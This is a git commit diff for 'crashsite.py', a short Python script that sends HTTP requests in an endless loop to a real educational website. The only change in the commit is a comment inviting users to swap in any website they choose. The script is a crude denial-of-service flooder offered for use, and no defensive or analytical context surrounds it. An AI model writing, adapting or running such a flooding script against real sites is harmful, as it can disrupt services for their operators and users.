976c8e1400bf9b96ac458196ced339043d4bb6c4
hashwnath <53908470+hashwnath@users.noreply.github.com>
2020-05-28 22:38:52 +0530

    Update crashsite.py

--- crashsite.py
+++ crashsite.py
@@ -1,5 +1,5 @@
 import requests
-url = "http://ncert.nic.in/"
+url = "http://ncert.nic.in/"  #this is a sample wesite. you can put any website of your wish, replacing the given website.
 c=1
 while c>0:
   requests.get(url)
